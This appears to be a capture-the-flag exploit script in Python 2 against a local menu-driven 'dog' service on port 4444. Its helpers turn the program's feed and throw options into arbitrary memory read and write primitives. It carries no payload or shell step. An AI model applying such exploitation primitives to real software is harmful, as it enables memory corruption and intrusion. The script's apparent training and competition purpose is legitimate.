#!/usr/bin/env python2
from pwnlib.tools import *
connect('localhost', 4444)

def wait_for_menu():
    ru('Choice: ')

def get(ty):
    wait_for_menu()
    sendln(1)
    sendln(ty)

def talk():
    x = ru('says:')
    if 'Dog drops' in x:
        return x.split('Dog drops ')[1].split('\nDog says')[0]

def throw(s, wait=True):
    wait_for_menu()
    sendln(2)
    sendln("throw")
    ru('throw? ')
    sendln(s)
    if wait:
        return talk()

def bread(x):
    wait_for_menu()
    sendln(2)
    sendln("feed")
    ru('give? ')
    sendln(x)
    return (int(ru(' ').strip()), talk())

def read(addr):
    current,_ = bread(0)
    _,x = bread((addr-current)%2**64)
    return u64(x[:8])

def write(addr, what):
    current,_ = bread(0)
    _,_ = bread((addr-current)%2**64)
    throw(what, wait=False)
